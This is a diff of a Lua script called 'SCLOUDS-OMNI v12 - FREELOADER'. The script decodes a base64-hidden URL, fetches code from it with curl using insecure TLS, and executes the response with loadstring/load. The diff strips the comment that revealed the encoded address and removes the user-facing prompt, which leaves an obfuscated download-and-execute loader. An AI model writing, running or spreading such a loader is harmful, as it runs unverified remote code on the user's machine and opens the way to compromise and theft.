@@ -1,5 +1,5 @@
 -- =============================================================
--- 🚀 SCLOUDS-OMNI v10 - FREE LOADER
+-- 🚀 SCLOUDS-OMNI v12 - FREELOADER
 -- =============================================================
 
 local function decode(str)
@@ -15,27 +15,23 @@ local function decode(str)
     end))
 end
 
-
--- "aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==" 
 local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
 local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")
 
-os.execute("clear")
-print("\27[1;36mScloudsOmni v12 - Connecting...\27[0m")
-
-io.write("\27[33m[?] Masukkan Nama Anda: \27[0m")
-local user = io.read()
-
--- Safe Executions
 local pipe = io.popen("curl -sL -k -A '" .. ident .. "' '" .. target .. "'")
 if pipe then
     local content = pipe:read("*a")
     pipe:close()
+    
     if content and content ~= "" then
-        local run = loadstring(content) or load(content)
+        local run, err = (loadstring or load)(content)
+        
         if run then
-            _G.UserName = user 
-            run()
+            run() -- Run The Freeloader.sh
+        else
+            print("\27[31m[ERROR]\27[0m Failed To Load Freeloader.sh: " .. tostring(err))
         end
+    else
+        print("\27[31m[ERROR]\27[0m Server Respond : Zero.")
     end
 end
